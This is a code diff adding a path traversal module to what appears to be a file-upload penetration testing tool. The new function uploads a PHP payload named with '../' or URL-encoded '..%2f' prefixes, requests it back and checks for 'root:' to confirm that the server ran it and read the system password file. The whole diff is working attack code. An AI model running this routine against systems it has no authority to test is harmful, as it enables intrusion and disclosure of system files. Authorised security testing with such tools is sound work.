@@ -443,6 +443,93 @@ def htaccess_overwrite(request_file, options, allowed_extension, function_number
                                                           overall_progress)
 
 
+def path_traversal(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
+    extension_to_test = options.file_extension
+    module = 'path_traversal'
+
+    info("Executing path traversal module.")
+
+    # Check if the file extension being tested is PHP (it works only with php)
+    if extension_to_test.lower() == 'php':
+
+        def build_url(url, file_name, decode=None):
+            from urllib.parse import urljoin
+            from urllib.parse import unquote
+            upload_dir = options.upload_dir
+            if options.upload_dir.endswith("=/"):
+                upload_dir = options.upload_dir[:-1]
+
+            if decode:
+                decoded_filename = unquote(file_name)
+                final_url = urljoin(url, upload_dir + decoded_filename)
+            else:
+                final_url = urljoin(url, upload_dir + file_name)
+
+            if "https://" in final_url:
+                final_url = final_url.replace("https", options.protocol)
+            else:
+                final_url = final_url.replace("http", options.protocol)
+
+            response, _ = send_get_request(headers, options, final_url)
+            
+            return response
+    
+        # Upload .htaccess file that overwrite the existing .htaccess and processes .arbit as PHP
+        with open("assets/samples/passwd_sample.php", 'rb') as file:
+            file_data = file.read()
+
+        # Calculate the progress bar
+        overall_progress = (function_number - 1) / total_functions * 100 + (1 / 1) / total_functions * 100
+
+        # Upload an arbitrary file extension
+        php_file_extension = f".php"
+        magic_bytes = False
+        mimetype = config.mimetypes["php"]
+        file_name = "../" + generate_random_string(10) + php_file_extension
+        skip_module = True  # Do not exit when a successful upload is occurred
+        headers, upload_status, response, url, _, current_time, user_options = file_upload(request_file, file_name,
+                                                                                        php_file_extension, options,
+                                                                                        magic_bytes, allowed_extension,
+                                                                                        mimetype, module,
+                                                                                        overall_progress, file_data,
+                                                                                        skip_module)
+        if options.upload_dir != 'optional':
+
+            response = build_url(url, file_name)
+
+            if upload_status == 'success':
+                if "root:" not in response.text:
+                    file_name = r"..%2f" + generate_random_string(10) + php_file_extension
+                    headers, upload_status, response, url, _, current_time, user_options = file_upload(request_file, file_name,
+                                                                                        php_file_extension, options,
+                                                                                        magic_bytes, allowed_extension,
+                                                                                        mimetype, module,
+                                                                                        overall_progress, file_data,
+                                                                                        skip_module)
+                    if upload_status == 'success':
+                        
+                        decode = True
+                        second_response = build_url(url, file_name, decode)
+                        if "root:" in second_response.text:
+                            _, _, _, _, _, _, _ = file_upload(request_file, file_name, extension_to_test, options,
+                                                                    magic_bytes, allowed_extension, mimetype, module,
+                                                                    overall_progress)
+                        
+                        else:
+                            printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
+                            warning(f"It seems like the app is not vulnerable to path traversal.")
+                            return
+            
+                elif "root:" in response.text:
+                    _, _, _, _, _, _, _ = file_upload(request_file, file_name, extension_to_test, options,
+                                                            magic_bytes, allowed_extension, mimetype, module,
+                                                            overall_progress)
+
+            else:
+                printing(options, user_options, response, file_name, 100, current_time, module, magic_bytes, mimetype)
+                warning(f"It seems like the app is not vulnerable to path traversal.")
+                return   
+        
 def svg_xxe(request_file, options, allowed_extension, function_number, total_functions, internal_progress=None, internal_total_iterations=None, leftover_extensions=None):
     module = 'svg_xxe'
 
